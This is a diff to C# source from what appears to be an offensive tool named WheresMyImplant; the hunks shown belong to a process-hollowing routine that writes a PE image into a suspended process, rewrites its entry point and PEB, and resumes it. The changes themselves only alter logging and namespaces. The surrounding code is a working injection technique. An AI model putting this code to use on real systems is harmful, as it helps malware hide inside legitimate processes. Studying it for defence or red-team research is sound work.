@@ -1,8 +1,8 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-using Unmanaged.Headers;
-using Unmanaged.Libraries;
+using MonkeyWorks.Unmanaged.Headers;
+using MonkeyWorks.Unmanaged.Libraries;
 
 namespace WheresMyImplant
 {
@@ -23,16 +23,16 @@ namespace WheresMyImplant
 
             try
             {
-                WriteOutputNeutral("Getting Thread Context");
+                Console.WriteLine("[*] Getting Thread Context");
                 kernel32.GetThreadContext(lpProcessInformation.hThread, ref context64);
             }
             catch (Exception)
             {
-                WriteOutputBad("GetThreadContext (64) Failed");
+                Console.WriteLine("[-] GetThreadContext (64) Failed");
             }
 
-            WriteOutputNeutral(String.Format("RCX Address: 0x{0}", context64.Rcx.ToString("X4")));
-            WriteOutputNeutral(String.Format("RDX Address: 0x{0}", context64.Rdx.ToString("X4")));
+            Console.WriteLine("[*] RCX Address: 0x{0}", context64.Rcx.ToString("X4"));
+            Console.WriteLine("[*] RDX Address: 0x{0}", context64.Rdx.ToString("X4"));
             return true;
         }
 
@@ -73,10 +73,10 @@ namespace WheresMyImplant
         internal Boolean RemapImage64()
         {
             ////////////////////////////////////////////////////////////////////////////////
-            WriteOutputNeutral(String.Format("Allocating 0x{0} bytes at 0x{1} - 0x{2}",
+            Console.WriteLine("[*] Allocating 0x{0} bytes at 0x{1} - 0x{2}",
                 image.Length.ToString("X4"),
                 targetImageBaseAddress.ToString("X4"),
-                (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4"))
+                (image.Length + targetImageBaseAddress.ToInt64()).ToString("X4")
             );
 
             allocatedTargetAddress = kernel32.VirtualAllocEx(
@@ -89,11 +89,11 @@ namespace WheresMyImplant
 
             if (IntPtr.Zero == allocatedTargetAddress)
             {
-                WriteOutputBad("VirtualAllocEx failed");
+                Console.WriteLine("[-] VirtualAllocEx failed");
                 return false;
             }
 
-            WriteOutputNeutral(String.Format("Source Image Base: 0x{0}", imageNTHeader64.OptionalHeader.ImageBase.ToString("X4")));
+            Console.WriteLine("[*] Source Image Base: 0x{0}", imageNTHeader64.OptionalHeader.ImageBase.ToString("X4"));
             ////////////////////////////////////////////////////////////////////////////////
             UInt32 bytesWritten = 0;
             if (!kernel32.WriteProcessMemory(
@@ -103,10 +103,10 @@ namespace WheresMyImplant
                 imageNTHeader64.OptionalHeader.SizeOfHeaders,
                 ref bytesWritten))
             {
-                WriteOutputBad("WriteProcessMemory failed");
+                Console.WriteLine("[-] WriteProcessMemory failed");
                 return false;
             }
-            WriteOutputGood(String.Format("Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader64.OptionalHeader.SizeOfHeaders));
+            Console.WriteLine("[+] Headers Copied: {0} of {1} bytes", bytesWritten, imageNTHeader64.OptionalHeader.SizeOfHeaders);
 
             ////////////////////////////////////////////////////////////////////////////////
             for (Int32 i = 0; i < imageNTHeader64.FileHeader.NumberOfSections; i++)
@@ -118,7 +118,7 @@ namespace WheresMyImplant
                     (Marshal.SizeOf(typeof(Winnt._IMAGE_SECTION_HEADER)) * i));
                 var imageSectionHeader = (Winnt._IMAGE_SECTION_HEADER)Marshal.PtrToStructure(offset, typeof(Winnt._IMAGE_SECTION_HEADER));
 
-                WriteOutputGood(String.Format("Writing Section {0}", new String(imageSectionHeader.Name)));
+                Console.WriteLine("[+] Writing Section {0}", new String(imageSectionHeader.Name));
                 bytesWritten = 0;
                 if (!kernel32.WriteProcessMemory(
                     lpProcessInformation.hProcess,
@@ -127,7 +127,7 @@ namespace WheresMyImplant
                     imageSectionHeader.SizeOfRawData,
                     ref bytesWritten))
                 {
-                    WriteOutputBad("WriteProcessMemory failed");
+                    Console.WriteLine("[-] WriteProcessMemory failed");
                     return false;
                 }
             }
@@ -143,10 +143,10 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal Boolean ResumeProcess64(Boolean wait)
         {
-            WriteOutputNeutral(String.Format("Updating Thread Context"));
+            Console.WriteLine("[*] Updating Thread Context");
 
             context64.Rcx = (UInt64)allocatedTargetAddress.ToInt64() + imageNTHeader64.OptionalHeader.AddressOfEntryPoint;
-            WriteOutputGood(String.Format("Updated Entry Point Address: 0x{0}", context64.Rcx.ToString("X4")));
+            Console.WriteLine("[+] Updated Entry Point Address: 0x{0}", context64.Rcx.ToString("X4"));
 
             //Updates the PEB
             UInt32 bytesWritten = 0;
@@ -157,7 +157,7 @@ namespace WheresMyImplant
                 (UInt32)Marshal.SizeOf(imageNTHeader64.OptionalHeader.ImageBase),
                 ref bytesWritten))
             {
-                WriteOutputBad("WriteProcessMemory failed");
+                Console.WriteLine("[-] WriteProcessMemory failed");
                 return false;
             }
 
@@ -165,7 +165,7 @@ namespace WheresMyImplant
             Marshal.StructureToPtr(context64, lpContext, false);
             kernel32.SetThreadContext(lpProcessInformation.hThread, lpContext);
 
-            WriteOutputNeutral("Resuming Main Thread");
+            Console.WriteLine("[*] Resuming Main Thread");
             kernel32.ResumeThread(lpProcessInformation.hThread);
 
             if (wait)
